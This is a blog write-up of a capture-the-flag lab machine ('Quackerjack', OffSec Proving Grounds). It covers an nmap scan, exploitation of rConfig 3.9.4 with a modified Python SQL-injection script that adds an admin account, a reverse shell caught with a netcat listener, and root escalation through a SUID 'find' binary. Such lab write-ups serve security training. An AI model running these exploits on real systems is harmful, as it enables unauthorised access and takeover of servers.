<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Quackerjack - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary Of ResultWe gain initial foothold by exploiting the vulnerable version of rConfig - Configuration Management application. We will then escalate our p...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/quackerjack-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Quackerjack - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/quackerjack-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Quackerjack - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 15, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//red">red</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 5 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary Of Result</strong></h1><p>We gain initial foothold by exploiting the vulnerable version of <code class="language-plaintext highlighter-rouge">rConfig - Configuration Management</code> application. We will then escalate our privilege via a misconfigred SUID binary.</p><hr><h1 id="attack-narrative"><strong>Attack Narrative</strong></h1><p>The general attack is wrapped up into three main phases:</p><ul><li>Enumeration</li><li>Exploitation</li><li>Privilege Escalation</li></ul><p><br></p><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We will begin with <code class="language-plaintext highlighter-rouge">nmap</code> scan:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap -sV -p- -A -Pn $IP -oA nmap/services</span>

21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.2
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
111/tcp   rpcbind
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: SAMBA<span class="o">)</span>
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 <span class="o">(</span>workgroup: SAMBA<span class="o">)</span>
3306/tcp open  mysql       syn-ack ttl 63 MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
8081/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
</code></pre></div></div><ul><li>There are several services running on the system, we specifically target <strong>HTTPS</strong> on port 8081.</li></ul><h4 id="web-application-port-8081"><strong>Web Application Port 8081</strong></h4><p>Navigate to the application, we can directly spot couple of interesting information:</p><ol><li>Running <strong>rConfig - Configuration Management</strong>.</li><li>Version 3.9.4 → Vulnerable?</li></ol><p>After a few researches, we discover that the running <strong>rConfig</strong> is actually vulnerable to Remote Code Execution.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># searchsploit rConfig 3.9.4</span>
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                                                   |  Path
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
rConfig 3.9.4 - <span class="s1">'search.crud.php'</span> Remote Command Injection                                                                                                                       | php/webapps/48241.py
rConfig 3.9.4 - <span class="s1">'searchField'</span> Unauthenticated Root Remote Code Execution                                                                                                         | php/webapps/48261.py
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><p>As stated in official document, the default credentials are <code class="language-plaintext highlighter-rouge">admin:admin</code>. However, it might not in this case.</p><p>According to the results from the previous <code class="language-plaintext highlighter-rouge">searchsploit</code> command, we can potentially execute either script and end up with a reverse shell.</p><ul><li>The second script (<code class="language-plaintext highlighter-rouge">searchField</code>) utilizes <strong>SQL Injection</strong> to create an <code class="language-plaintext highlighter-rouge">admin</code> user → login as <code class="language-plaintext highlighter-rouge">admin</code> → abuse the <code class="language-plaintext highlighter-rouge">ajaxArchiveFiles.php</code> file to execute malicious payload.</li><li>The first script (<code class="language-plaintext highlighter-rouge">search.crud.php</code>) exploits the <code class="language-plaintext highlighter-rouge">search.crud.php</code> file and the <code class="language-plaintext highlighter-rouge">nodeId</code> parameter to obtain a reverse shell.</li></ul><p>Unfortunately, this is not the case because the second script fails to return a revese shell while we need a valid admin credential to successfully execute the first script.</p><p>We can try to brute force admin credentials with the username is <code class="language-plaintext highlighter-rouge">admin</code>. However, we can also choose to combine two scripts and make our exploit work. As mentioned, the second script will create an <code class="language-plaintext highlighter-rouge">admin</code> user by exploiting SQL Injection vulnerability, but the script need to be modified. Otherwise, it won’t work.</p><p>The following is the modified script, which can be used to create a valid <code class="language-plaintext highlighter-rouge">admin</code> user:</p><div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">requests.exceptions</span> <span class="kn">import</span> <span class="n">Timeout</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">"[+] Usage : ./rconfig_exploit.py https://target"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">vuln_page</span><span class="o">=</span><span class="s">"/commands.inc.php"</span>
<span class="n">vuln_parameters</span><span class="o">=</span><span class="s">"?searchOption=contains&amp;searchField=vuln&amp;search=search&amp;searchColumn=command"</span>

<span class="k">print</span> <span class="p">(</span><span class="s">"[+] Adding a temporary admin user..."</span><span class="p">)</span>
<span class="n">fake_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span><span class="mi">900</span><span class="p">))</span>
<span class="n">fake_user</span> <span class="o">=</span> <span class="s">"attacker"</span>
<span class="n">fake_pass_md5</span> <span class="o">=</span> <span class="s">"21232f297a57a5a743894a0e4a801fc3"</span> <span class="c1"># hash of 'admin'
</span><span class="n">fake_userid_md5</span> <span class="o">=</span> <span class="s">"6c97424dc92f14ae78f8cc13cd08308d"</span>
<span class="n">addUserPayload</span><span class="o">=</span><span class="s">"%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20("</span><span class="o">+</span><span class="n">fake_id</span><span class="o">+</span><span class="s">",%20'"</span><span class="o">+</span><span class="n">fake_user</span><span class="o">+</span><span class="s">"',%20'"</span><span class="o">+</span><span class="n">fake_pass_md5</span><span class="o">+</span><span class="s">"',%20'"</span><span class="o">+</span><span class="n">fake_userid_md5</span><span class="o">+</span><span class="s">"',%209,%20'"</span><span class="o">+</span><span class="n">fake_user</span><span class="o">+</span><span class="s">"@domain.com',%201346920339,%201);--"</span>
<span class="n">encoded_request</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="n">vuln_page</span><span class="o">+</span><span class="n">vuln_parameters</span><span class="o">+</span><span class="n">addUserPayload</span>
<span class="n">firstrequest</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">exploit_req</span> <span class="o">=</span> <span class="n">firstrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">encoded_request</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">login_info</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"user"</span><span class="p">:</span> <span class="n">fake_user</span><span class="p">,</span>
    <span class="s">"pass"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
    <span class="s">"sublogin"</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">}</span>
<span class="k">print</span> <span class="p">(</span><span class="s">"[+] Authenticating as: "</span><span class="o">+</span><span class="n">fake_user</span><span class="o">+</span><span class="s">":admin ..."</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">"[+] Done."</span><span class="p">)</span>
</code></pre></div></div><p>After executing the above script, we should be able to login with the credentials: <code class="language-plaintext highlighter-rouge">attacker:admin</code>. Now that we have the valid credentials, we can procure a reverse shell using the first script.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 48241.py https://192.168.78.57:8081 attacker admin 192.168.49.78 80</span>
...
</code></pre></div></div><p>Our listener caught the revere shell at port 80 as <code class="language-plaintext highlighter-rouge">apache</code> user.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -nlvp 80                                                                                                                                                                           2 ⚙ </span>
listening on <span class="o">[</span>any] 80 ...                                                                                                                                                                     
connect to <span class="o">[</span>192.168.49.78] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.78.57] 56142
bash: no job control <span class="k">in </span>this shell
bash-4.2<span class="nv">$ </span><span class="nb">whoami
whoami
</span>apache
</code></pre></div></div><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="suid"><strong>SUID</strong></h4><p>Locally enumerate the target reveals us a <code class="language-plaintext highlighter-rouge">/usr/bin/find</code> SUID binary.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-ls</span> 2&gt;/dev/null
12596477  196 <span class="nt">-rwsr-xr-x</span>   1 root     root       199304 Oct 30  2018 /usr/bin/find
<span class="o">[</span>...]
</code></pre></div></div><h4 id="suid-abuse"><strong>SUID Abuse</strong></h4><p>Leverage the <code class="language-plaintext highlighter-rouge">find</code> SUID binary, we can easily acquire <code class="language-plaintext highlighter-rouge">root</code> shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/bash <span class="nt">-p</span> <span class="se">\;</span>
bash-4.2# <span class="nb">whoami
</span>root
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>